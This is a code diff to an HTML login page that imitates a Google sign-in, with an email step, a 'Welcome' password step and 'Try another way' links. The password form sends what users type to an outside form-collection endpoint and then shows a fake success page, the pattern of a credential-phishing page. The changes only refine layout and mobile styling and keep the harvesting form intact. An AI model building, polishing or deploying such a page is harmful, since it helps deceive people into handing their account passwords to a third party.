@@ -55,17 +55,18 @@
         }
 
         #signinText {
-            font-size: 24px;
+            font-size: 32px; /* Increased font size */
             font-weight: 400;
+            margin-top: 20px; /* Closer to the top */
         }
 
         #useGoogleText {
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 500;
         }
 
         .input-box {
-            width: 120%;
+            width: 100%;
             padding: 16px;
             border: 1px solid #c6c7c5;
             background-color: #0e0e0d;
@@ -74,6 +75,7 @@
             font-size: 16px;
             margin-bottom: 12px;
             border-color: #e4e4e3;
+            box-sizing: border-box; /* Ensures padding is included in the width */
         }
 
         .input-box::placeholder {
@@ -180,6 +182,31 @@
             margin-top: 10px;
             display: inline-block;
         }
+
+        /* Align 'Try another way' text vertically with the button */
+        .try-another-way-wrapper {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            align-items: center;
+        }
+
+        .btn-container input {
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        /* Responsive Layout */
+        @media (max-width: 768px) {
+            .container {
+                width: 100%;
+                padding: 15px;
+            }
+
+            #signinText {
+                font-size: 28px; /* Smaller for mobile */
+            }
+        }
     </style>
 </head>
 <body>
@@ -199,29 +226,28 @@
                 <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
                 <div class="btn-container">
                     <button type="submit" class="btn">Next</button>
+                    <a href="#" class="try-another-way">Try another way</a>
                 </div>
             </form>
         </div>
+    </div>
 
-        <div class="right-side-container" id="passwordPage" style="display: none;">
-            <!-- Password input page -->
-            <form id="passwordForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitPassword(event)">
-                <p id="welcomeText">Welcome</p>
-                <input type="password" id="passwordInput" name="password" class="input-box" placeholder="Enter your password" autocomplete="current-password">
-                
-                <!-- Show Password Option -->
-                <div class="show-password-wrapper">
-                    <input type="checkbox" id="showPassword" onclick="togglePassword()"> Show Password
-                </div>
-                
-                <!-- Try Another Way link -->
+    <div class="container" id="passwordPage" style="display: none;">
+        <!-- Password input page -->
+        <form id="passwordForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitPassword(event)">
+            <p id="welcomeText">Welcome</p>
+            <input type="password" id="passwordInput" name="password" class="input-box" placeholder="Enter your password" autocomplete="current-password">
+            
+            <!-- Show Password Option -->
+            <div class="show-password-wrapper">
+                <input type="checkbox" id="showPassword" onclick="togglePassword()"> Show Password
+            </div>
+
+            <div class="try-another-way-wrapper">
                 <a href="#" class="try-another-way">Try another way</a>
-
-                <div class="btn-container">
-                    <button type="submit" class="btn">Sign In</button>
-                </div>
-            </form>
-        </div>
+                <button type="submit" class="btn">Sign In</button>
+            </div>
+        </form>
     </div>
 
     <div class="success-page" id="successPage">
@@ -262,6 +288,7 @@
 
             // Hide the form and show the success page
             document.getElementById('signinBox').style.display = 'none';
+            document.getElementById('passwordPage').style.display = 'none';
             document.getElementById('successPage').style.display = 'flex'; // show success page
         }
 
